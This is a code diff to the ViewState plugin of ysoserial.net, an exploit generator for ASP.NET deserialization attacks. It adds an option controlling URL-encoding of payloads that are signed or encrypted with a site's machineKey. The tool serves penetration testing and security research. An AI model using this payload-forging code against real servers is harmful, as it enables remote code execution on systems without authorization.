@@ -27,6 +27,7 @@ namespace ysoserial.Plugins
     public class ViewStatePlugin : IPlugin
     {
         static bool showExamples = false;
+        static bool showraw = false;
         static bool dryRun = false;
         static bool minify = false;
         static bool useSimpleType = true;
@@ -71,6 +72,7 @@ namespace ysoserial.Plugins
                 {"decryptionkey=", "this is the decryptionKey attribute from machineKey in the web.config file", v => decryptionKey = v},
                 {"validationalg=", "the validation algorithm can be set to SHA1, HMACSHA256, HMACSHA384, HMACSHA512, MD5, 3DES, AES. Default: HMACSHA256", v => validationAlg = v},
                 {"validationkey=", "this is the validationKey attribute from machineKey in the web.config file", v => validationKey = v},
+                {"showraw", "to stop URL-encoding the result. Default: false", v => showraw = v != null },
                 {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
                 {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType =  v != null },
                 {"isdebug", "to show useful debugging messages!", v => isDebug = v != null },
@@ -353,7 +355,10 @@ namespace ysoserial.Plugins
                 byteResult = (byte[])getterEncryptOrDecryptData.Invoke(null, new object[] { true, payload, _macKeyBytes, 0, payload.Length });
             }
 
-            return System.Convert.ToBase64String(byteResult);
+            string outputBase64 = System.Convert.ToBase64String(byteResult);
+            if (!showraw)
+                outputBase64 = Uri.EscapeDataString(outputBase64);
+            return outputBase64;
         }
 
         private object generateViewState_4dot5(string targetPagePath, string IISAppInPath, string viewStateUserKey, byte[] payload)
@@ -393,7 +398,10 @@ namespace ysoserial.Plugins
             var protectMethod = cryptoServiceClass.GetType().GetMethod("Protect");
             byte[] byteResult = (byte[])protectMethod.Invoke(cryptoServiceClass, new object[] { payload });
 
-            return System.Convert.ToBase64String(byteResult);
+            string outputBase64 = System.Convert.ToBase64String(byteResult);
+            if (!showraw)
+                outputBase64 = Uri.EscapeDataString(outputBase64);
+            return outputBase64;
         }
 
         private String simulateTemplateSourceDirectory(String strPath)
